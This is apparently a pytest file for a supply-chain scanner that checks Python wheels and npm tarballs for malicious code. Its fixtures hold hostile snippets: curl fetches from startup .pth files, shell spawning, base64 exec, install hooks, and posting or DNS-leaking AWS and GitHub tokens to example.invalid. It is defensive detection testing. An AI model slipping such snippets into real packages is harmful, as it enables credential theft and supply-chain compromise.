from __future__ import annotations

import base64
import hashlib
import io
import json
import tarfile
import zipfile

from ca9.analyzers.package_code import analyze_package_snapshots
from ca9.artifacts.fetch import ArtifactScanConfig, collect_artifact_snapshots
from ca9.core.models import Artifact, Inventory, Package, SourceEvidence


def test_package_code_analyzer_blocks_pth_startup_execution(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("bad.pth", "import os; os.system('curl https://example.invalid/payload')\n")

    findings = _analyze_archive(tmp_path, wheel)

    assert findings[0].signal_type == "python-startup-pth-exec"
    assert findings[0].metadata["action"] == "block"
    assert findings[0].evidence[0].metadata["file_path"] == "bad.pth"


def test_package_code_analyzer_blocks_setup_install_execution(tmp_path):
    sdist = tmp_path / "bad-1.0.0.tar.gz"
    with tarfile.open(sdist, "w:gz") as tf:
        payload = b"import subprocess\nsubprocess.run(['sh', '-c', 'echo bad'])\n"
        info = tarfile.TarInfo("bad-1.0.0/setup.py")
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))

    findings = _analyze_archive(tmp_path, sdist, kind="sdist")

    assert findings[0].signal_type == "setup-install-exec"
    assert findings[0].metadata["action"] == "block"
    assert findings[0].evidence[0].metadata["file_path"] == "bad-1.0.0/setup.py"


def test_package_code_analyzer_blocks_encoded_execution(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr(
            "bad/loader.py",
            "import base64\npayload = base64.b64decode('cHJpbnQoMSk=')\nexec(payload)\n",
        )

    findings = _analyze_archive(tmp_path, wheel)

    assert findings[0].signal_type == "encoded-execution"
    assert findings[0].metadata["action"] == "block"
    assert findings[0].evidence[0].metadata["line"] == 2


def test_package_code_analyzer_blocks_sitecustomize_startup_execution(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("sitecustomize.py", "import subprocess\nsubprocess.Popen(['sh'])\n")

    findings = _analyze_archive(tmp_path, wheel)

    assert findings[0].signal_type == "python-startup-customize-exec"
    assert findings[0].metadata["action"] == "block"


def test_package_code_analyzer_blocks_credential_network_exfiltration(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr(
            "bad/exfil.py",
            "import os, requests\n"
            "token = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
            "requests.post('https://example.invalid/collect', data=token)\n",
        )

    findings = _analyze_archive(tmp_path, wheel)

    assert any(finding.signal_type == "credential-network-exfiltration" for finding in findings)


def test_package_code_analyzer_blocks_import_time_risky_behavior(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("bad/__init__.py", "import os\nos.system('touch /tmp/bad')\n")

    findings = _analyze_archive(tmp_path, wheel)

    assert any(finding.signal_type == "import-time-risky-behavior" for finding in findings)


def test_package_code_analyzer_investigates_silent_process_execution(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr(
            "bad/worker.py",
            "import subprocess\ndef run():\n    return subprocess.check_output(['id'])\n",
        )

    findings = _analyze_archive(tmp_path, wheel)

    finding = next(item for item in findings if item.signal_type == "silent-process-execution")
    assert finding.metadata["action"] == "investigate"


def test_package_code_analyzer_ignores_benign_package(tmp_path):
    wheel = tmp_path / "benign-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("benign/__init__.py", "VALUE = 1\n")

    findings = _analyze_archive(tmp_path, wheel, package_name="benign")

    assert findings == []


def test_package_code_analyzer_blocks_npm_known_tanstack_ioc(tmp_path):
    package = tmp_path / "react-router-1.169.5.tgz"
    _write_tgz(
        package,
        {
            "package/package.json": json.dumps(
                {
                    "name": "@tanstack/react-router",
                    "version": "1.169.5",
                    "optionalDependencies": {
                        "@tanstack/setup": (
                            "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
                        )
                    },
                }
            ),
        },
    )

    findings = _analyze_archive(
        tmp_path,
        package,
        package_name="@tanstack/react-router",
        ecosystem="npm",
        kind="npm-tarball",
        hash_value=_sha512_sri(package),
    )

    finding = next(item for item in findings if item.signal_type == "npm-known-malware-ioc")
    assert finding.metadata["action"] == "block"
    assert finding.evidence[0].metadata["file_path"] == "package/package.json"


def test_package_code_analyzer_blocks_npm_obfuscated_payload(tmp_path):
    package = tmp_path / "mistralai-2.2.2.tgz"
    obfuscated = "var " + ",".join(f"_0x{index:04x}=1" for index in range(10_000)) + ";"
    _write_tgz(
        package,
        {
            "package/package.json": json.dumps(
                {
                    "name": "@mistralai/mistralai",
                    "version": "2.2.2",
                    "scripts": {"preinstall": "node setup.mjs"},
                }
            ),
            "package/router_init.js": obfuscated,
        },
    )

    findings = _analyze_archive(
        tmp_path,
        package,
        package_name="@mistralai/mistralai",
        ecosystem="npm",
        kind="npm-tarball",
        hash_value=_sha512_sri(package),
    )

    assert any(finding.signal_type == "npm-lifecycle-script" for finding in findings)
    obfuscated_finding = next(
        item for item in findings if item.signal_type == "npm-obfuscated-payload"
    )
    assert obfuscated_finding.metadata["action"] == "block"


def test_package_code_analyzer_blocks_npm_node_e_lifecycle_script(tmp_path):
    package = tmp_path / "loader-1.0.0.tgz"
    _write_tgz(
        package,
        {
            "package/package.json": json.dumps(
                {
                    "name": "loader",
                    "version": "1.0.0",
                    "scripts": {
                        "postinstall": ("node -e \"require('child_process').execSync('id')\"")
                    },
                }
            ),
        },
    )

    findings = _analyze_archive(
        tmp_path,
        package,
        package_name="loader",
        ecosystem="npm",
        kind="npm-tarball",
        hash_value=_sha512_sri(package),
    )

    finding = next(item for item in findings if item.signal_type == "npm-lifecycle-script")
    assert finding.metadata["action"] == "block"


def test_package_code_analyzer_blocks_npm_fetch_exfiltration(tmp_path):
    package = tmp_path / "stealer-1.0.0.tgz"
    _write_tgz(
        package,
        {
            "package/index.js": (
                "const token = process.env.GITHUB_TOKEN;\n"
                "fetch('https://example.invalid/collect', { method: 'POST', body: token });\n"
            ),
        },
    )

    findings = _analyze_archive(
        tmp_path,
        package,
        package_name="stealer",
        ecosystem="npm",
        kind="npm-tarball",
        hash_value=_sha512_sri(package),
    )

    finding = next(
        item for item in findings if item.signal_type == "npm-credential-network-exfiltration"
    )
    assert finding.metadata["action"] == "block"


def test_package_code_analyzer_blocks_npm_dns_env_exfiltration(tmp_path):
    package = tmp_path / "dns-stealer-1.0.0.tgz"
    _write_tgz(
        package,
        {
            "package/index.js": (
                "const dns = require('dns');\n"
                "const data = JSON.stringify(process.env);\n"
                "dns.resolveTxt(`${Buffer.from(data).toString('hex')}.example.invalid`, () => {});\n"
            ),
        },
    )

    findings = _analyze_archive(
        tmp_path,
        package,
        package_name="dns-stealer",
        ecosystem="npm",
        kind="npm-tarball",
        hash_value=_sha512_sri(package),
    )

    finding = next(
        item for item in findings if item.signal_type == "npm-credential-network-exfiltration"
    )
    assert finding.metadata["action"] == "block"


def test_package_code_analyzer_scans_nul_padded_javascript(tmp_path):
    package = tmp_path / "nul-stealer-1.0.0.tgz"
    _write_tgz(
        package,
        {
            "package/index.js": (
                b"\x00const token = process.env.GITHUB_TOKEN;\n"
                b"fetch('https://example.invalid/collect', { body: token });\n"
            ),
        },
    )

    findings = _analyze_archive(
        tmp_path,
        package,
        package_name="nul-stealer",
        ecosystem="npm",
        kind="npm-tarball",
        hash_value=_sha512_sri(package),
    )

    assert any(finding.signal_type == "npm-credential-network-exfiltration" for finding in findings)


def _analyze_archive(
    tmp_path,
    archive_path,
    *,
    package_name: str = "bad",
    ecosystem: str = "pypi",
    kind: str = "wheel",
    hash_value: str | None = None,
):
    evidence = SourceEvidence(source="test", path=str(archive_path), reader="test")
    package = Package(
        name=package_name,
        version="1.0.0",
        ecosystem=ecosystem,
        dependency_kind="direct",
        artifacts=(
            Artifact(
                kind=kind,
                url=archive_path.as_uri(),
                hash=hash_value or f"sha256:{_sha256(archive_path)}",
                evidence=(evidence,),
            ),
        ),
        evidence=(evidence,),
    )
    inventory = Inventory(repo_path=str(tmp_path), packages=(package,))
    result = collect_artifact_snapshots(
        inventory,
        ArtifactScanConfig(cache_dir=tmp_path / "cache"),
    )
    assert not result.findings
    return analyze_package_snapshots(result.snapshots)


def _write_tgz(path, files: dict[str, str | bytes]) -> None:
    with tarfile.open(path, "w:gz") as tf:
        for name, content in files.items():
            payload = content if isinstance(content, bytes) else content.encode()
            info = tarfile.TarInfo(name)
            info.size = len(payload)
            tf.addfile(info, io.BytesIO(payload))


def _sha256(path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def _sha512_sri(path) -> str:
    digest = hashlib.sha512()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return "sha512-" + base64.b64encode(digest.digest()).decode()
